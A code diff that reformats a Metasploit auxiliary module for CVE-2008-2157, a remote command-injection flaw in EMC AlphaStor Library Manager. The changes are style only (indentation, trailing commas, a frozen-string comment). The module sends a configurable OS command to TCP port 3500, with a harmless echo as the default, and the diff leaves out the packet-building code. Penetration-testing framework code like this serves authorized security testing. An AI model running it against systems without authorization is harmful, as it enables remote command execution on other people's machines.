@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -5,34 +6,33 @@
 
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',
-      'Description'    => %q{
-          EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability
-          because the application fails to properly sanitize user-supplied input.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
-          [ 'CVE', '2008-2157' ],
-          [ 'OSVDB', '45715' ],
-          [ 'BID', '29398' ],
-        ],
-      'DisclosureDate' => 'May 27 2008'))
+                      'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',
+                      'Description'    => %q(
+                          EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability
+                          because the application fails to properly sanitize user-supplied input.
+                      ),
+                      'Author'         => [ 'MC' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
+                          [ 'CVE', '2008-2157' ],
+                          [ 'OSVDB', '45715' ],
+                          [ 'BID', '29398' ]
+                        ],
+                      'DisclosureDate' => 'May 27 2008'))
 
-      register_options(
-        [
-          Opt::RPORT(3500),
-          OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt']),
-        ], self.class)
+    register_options(
+      [
+        Opt::RPORT(3500),
+        OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt'])
+      ], self.class
+    )
   end
 
   def run
@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Sending command: #{datastore['CMD']}")
     sock.put(pkt)
 
-    select(nil,nil,nil,1)
+    select(nil, nil, nil, 1)
 
     sock.get_once
 
